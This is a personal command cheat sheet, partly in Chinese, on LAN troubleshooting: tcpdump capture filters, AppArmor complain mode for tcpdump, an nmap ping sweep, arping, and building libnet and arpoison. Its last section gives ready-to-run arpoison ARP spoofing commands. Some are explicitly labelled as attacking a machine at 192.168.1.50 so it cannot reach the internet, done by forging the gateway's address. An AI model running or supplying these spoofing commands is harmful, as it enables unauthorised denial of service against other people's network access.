#check complain mode
tcpdump: test1.log: Permission denied
#开始以为是用户权限的问题，后来换用root账户还是不行，经搜索，是AppArmor的问题
apt-get install apparmor-utils
sudo aa-complain /usr/sbin/tcpdump



tcpdump -i eth0 -nn 'host 192.168.2.249' -w check.cap
tcpdump -i eth0 -nn 'host 192.168.2.246'
tcpdump  -p arp

nmap -sP 192.168.2.0/24

tcpdump host 192.168.2.1

抓取网口eth0上源mac地址或目的mac地址为00:21:85:6C:D9:A3的所有数据包
tcpdump -i eth0 ether src or dst 34:97:f6:99:a1:ed

sudo tcpdump -n -r arp_check222.cap|awk -F '[,]+' '{print $2}'|sort|uniq -c|sort -n

arp -a

192.168.2.252 34:97:f6:99:a1:ed
192.168.2.1 84:ad:58:ae:b8:af

#用法举例：比如我的ip 192.168.1.101 网关:192.168.1.1
arping -U -I eth0 -s 192.168.2.88 192.168.2.1

arping -U -I eth0 -s 192.168.1.229 192.168.1.1



#install libnet
wget https://nchc.dl.sourceforge.net/project/libnet-dev/libnet-1.1.6.tar.gz
tar zxvf libnet-1.1.6.tar.gz
cd libnet-1.1.6/
sudo ./configure
sudo make
sudo make install


#install arpison
gcc arpoison.c /usr/local/lib/libnet.a -o arpoison
sudo ln -sf arpoison /bin/arpoison

比如我想防止arp 攻击
sudo arpoison -i eth0 -d 192.168.1.1 -s 192.168.1.101 -t ff:ff:ff:ff:ff:ff -r 00:1c:bf:03:9f:c7

比如我想攻击192.168.1.50的机器不让他上网
sudo arpoison -i eth0 -d 192.168.1.50 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 00:1c:bf:03:9f:c7
sudo arpoison -i enp4s0 -d 192.168.2.249 -s 192.168.2.1 -t ff:ff:ff:ff:ff:ff -r 1c:1b:0d:2d:94:87


